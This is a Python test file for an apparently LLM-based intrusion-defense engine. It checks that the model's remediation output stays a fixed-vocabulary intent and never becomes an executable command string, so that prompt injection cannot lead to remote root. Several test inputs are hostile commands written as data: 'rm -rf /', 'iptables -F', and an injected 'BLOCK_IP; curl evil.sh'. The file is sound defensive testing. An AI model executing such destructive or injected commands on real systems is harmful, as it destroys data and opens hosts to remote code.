"""GemmaEngine output contract.

The model's remediation output is an *intent* from a fixed vocabulary, never a command
string. These tests pin that boundary — it is the difference between a prompt injection
being a nuisance and being remote root.
"""

import pytest

from backend.pipeline.gemma_engine import GemmaEngine


@pytest.fixture
def engine():
    return GemmaEngine()


# ===== Structured intent parsing =====

def test_valid_structured_action_is_honoured(engine):
    action = engine._parse_defense_action(
        {"defense_action": {"action": "BAN_SSH", "target_ip": "1.2.3.4"}}, "9.9.9.9"
    )
    assert action == {"action": "BAN_SSH", "target_ip": "1.2.3.4"}


def test_benign_verdict_yields_no_action(engine):
    action = engine._parse_defense_action({"anomaly_detected": False}, "9.9.9.9")
    assert action["action"] == "NONE"


@pytest.mark.parametrize("bogus", [
    "rm -rf /",
    "EXEC_SHELL",
    "BLOCK_IP; curl evil.sh",
    "",
    None,
    42,
])
def test_unknown_action_names_never_survive(engine, bogus):
    action = engine._parse_defense_action(
        {"defense_action": {"action": bogus, "target_ip": "1.2.3.4"}}, "9.9.9.9"
    )
    assert action["action"] in GemmaEngine.VALID_ACTIONS


def test_legacy_command_strings_are_discarded(engine):
    """A model still emitting the old free-text field must not have it executed."""
    action = engine._parse_defense_action(
        {"active_defense_actions": ["iptables -F", "rm -rf /"]}, "9.9.9.9"
    )
    assert action == {"action": "BLOCK_IP", "target_ip": "9.9.9.9"}
    assert "iptables" not in str(action)


def test_missing_defense_action_defaults_to_blocking_the_source(engine):
    action = engine._parse_defense_action({"anomaly_detected": True}, "172.28.0.10")
    assert action == {"action": "BLOCK_IP", "target_ip": "172.28.0.10"}


# ===== Schema =====

def test_response_schema_has_no_free_text_command_field(engine):
    """Regression guard: the old `active_defense_actions: string[]` must stay gone."""
    prompt = engine.SYSTEM_PROMPT
    assert "active_defense_actions" not in prompt
    assert "defense_action" in prompt
    for verb in GemmaEngine.VALID_ACTIONS:
        assert verb in prompt


# ===== Rule-based fallback (LLM unavailable) =====

def test_fallback_port_scan_requests_ip_block(engine):
    verdict = engine._fallback_analysis({
        "source_ip": "172.28.0.10",
        "gnn_score": 0.9,
        "features": {"unique_dst_ports": 40, "syn_count": 50},
    })
    assert verdict["threat_type"] == "PORT_SCAN"
    assert verdict["defense_action"] == {"action": "BLOCK_IP", "target_ip": "172.28.0.10"}


def test_fallback_brute_force_requests_ssh_ban(engine):
    verdict = engine._fallback_analysis({
        "source_ip": "10.0.0.7",
        "gnn_score": 0.5,
        "features": {"failed_auth_count": 5},
    })
    assert verdict["defense_action"] == {"action": "BAN_SSH", "target_ip": "10.0.0.7"}


def test_fallback_benign_requests_nothing(engine):
    verdict = engine._fallback_analysis({
        "source_ip": "10.0.0.9", "gnn_score": 0.01, "features": {},
    })
    assert verdict["threat_type"] == "BENIGN"
    assert verdict["defense_action"]["action"] == "NONE"
    assert verdict["mitigation"] == "NONE"


def test_every_fallback_path_emits_a_valid_action(engine):
    scenarios = [
        {"unique_dst_ports": 40, "syn_count": 50},
        {"connection_frequency": 90.0},
        {"failed_auth_count": 9},
        {},
    ]
    for features in scenarios:
        verdict = engine._fallback_analysis(
            {"source_ip": "10.0.0.1", "gnn_score": 0.8, "features": features}
        )
        assert verdict["defense_action"]["action"] in GemmaEngine.VALID_ACTIONS


# ===== Display strings are inert =====

def test_mitigation_string_is_display_only(engine):
    """`mitigation` is rendered in the UI; it must never be what gets executed."""
    verdict = engine._fallback_analysis({
        "source_ip": "172.28.0.10", "gnn_score": 0.9,
        "features": {"unique_dst_ports": 40, "syn_count": 50},
    })
    # The executable intent is structured; the string is a human rendering of it.
    assert isinstance(verdict["mitigation"], str)
    assert isinstance(verdict["defense_action"], dict)
